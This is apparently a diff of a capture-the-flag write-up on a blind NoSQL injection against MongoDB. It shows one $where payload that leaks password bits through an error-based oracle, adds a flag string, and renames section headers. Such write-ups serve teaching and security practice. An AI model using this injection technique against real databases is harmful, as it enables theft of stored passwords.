@@ -30,11 +30,14 @@ include match groups. I ended up replacing the whole string. In the end, the que
     { '$where': '"";((this.password_wblm2gvcl0p.charCodeAt(16) >>> 0) & 1) || lolwut;""' } { '$set': { last_access: '2018-04-04 19:59:15 +02:00' } }
     
 When mongo returns with an error (because it could not evaluate the expression as `lolwut` is not defined), the http
-connection is closed abruptly.
+connection is closed abruptly. I ended up adding some retry logic to mitigate network errors corrupting our precious
+bits.
+
+Flag: `flag{13fc892df79a86494792e14dcbef252a}`
 
 
-Solution
-========
+Solution source
+===============
 
 ```python3
 import requests
@@ -82,7 +85,7 @@ print("SOLUTION {!r}".format(prefix))
 ```
  
 
-Challenge Source
+Challenge source
 ================
 
 ```javascript
